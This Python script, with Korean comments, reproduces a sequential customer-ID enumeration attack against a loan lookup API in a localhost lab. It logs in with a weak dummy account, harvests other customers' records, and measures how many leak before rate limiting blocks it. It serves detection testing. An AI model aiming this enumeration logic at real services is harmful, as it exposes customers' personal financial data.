"""대입 조회 공격 '재현' 스크립트 — 랩 전용(127.0.0.1 하드코딩).

이번 신한 사고의 ②~③단계(약한 인증 통과 후, 고객번호를 순차 대입해
남의 데이터를 대량 조회)를 축소 재현한다.

측정값:
  - 유출 성공 건수 (몇 건이나 빼냈나)
  - MTTD: 공격 시작 ~ 첫 차단까지 걸린 요청 수/시간

반드시 본인이 띄운 로컬 랩에만 사용할 것.
"""
from __future__ import annotations

import time

import httpx

BASE = "http://127.0.0.1:8000"   # 랩 전용. 외부 주소로 바꾸지 말 것.


def run(broker_id: str = "broker01", password: str = "lab-demo-pw-01",
        start: int = 1, count: int = 500, delay: float = 0.0,
        owned_ids: set[int] | None = None) -> dict:
    # owned_ids: 이 모집인이 '정당하게' 볼 수 있는 고객. 그 밖을 빼내면 침해.
    owned = owned_ids or set()
    stolen: list[dict] = []
    blocked_at: int | None = None
    t0 = time.time()

    with httpx.Client(base_url=BASE, timeout=5.0) as c:
        # ① 로그인(약한 인증 통과) — 랩 더미 계정
        r = c.post("/login", json={"broker_id": broker_id, "password": password})
        if r.status_code != 200:
            return {"error": f"login failed: {r.status_code} {r.text}"}
        token = r.json()["token"]
        headers = {"Authorization": f"Bearer {token}"}

        # ② 고객번호 순차 대입 조회 (남의 데이터까지)
        for i, cid in enumerate(range(start, start + count), 1):
            resp = c.get(f"/loan/lookup/{cid}", headers=headers)
            if resp.status_code == 200:
                stolen.append(resp.json())
            elif resp.status_code == 429:          # 탐지/차단
                blocked_at = i
                break
            # 403(담당 아님)·404는 계속 시도
            if delay:
                time.sleep(delay)

    elapsed = time.time() - t0
    unauthorized = [s for s in stolen if s["customer_id"] not in owned]
    return {
        "requests_sent": blocked_at or count,
        "stolen_count": len(stolen),
        "unauthorized_count": len(unauthorized),   # 남의 데이터 유출(= 침해)
        "blocked_at_request": blocked_at,
        "elapsed_sec": round(elapsed, 3),
        "sample": stolen[:3],
    }


if __name__ == "__main__":
    import json

    result = run()
    print(json.dumps(result, ensure_ascii=False, indent=2))
    if result.get("blocked_at_request"):
        print(f"\n→ {result['blocked_at_request']}번째 요청에서 차단됨 "
              f"(유출 {result['stolen_count']}건에서 멈춤)")
    else:
        print(f"\n→ 차단 없음. {result['stolen_count']}건 전량 유출.")
